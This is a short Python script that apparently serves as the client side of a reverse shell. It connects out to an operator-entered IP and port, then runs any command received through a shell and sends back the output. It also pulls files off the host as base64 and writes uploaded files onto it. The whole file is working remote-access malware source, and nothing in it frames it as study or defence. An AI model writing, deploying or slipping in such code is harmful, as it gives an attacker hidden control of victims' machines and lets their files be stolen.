import socket
import json
import subprocess
import os
import base64 
import time

def server(ip, port):
    global connection 
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def recieve():
    json_data = '' 
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        command = recieve()
        if command == 'exit':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            os.chdir(command[3:])
        elif command [:8] == 'download':
            with open(command[9:], 'rb') as f:
                send(base64.b64encode(f.read()).decode('utf-8'))
        elif command[:6] == 'upload':
            with open(command[7:], 'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            result = process.stdout.read() + process.stderr.read()
            send(result)

ip = input("Enter the IP: ")
port = int(input("Enter the Port: "))

server(ip, port)
run()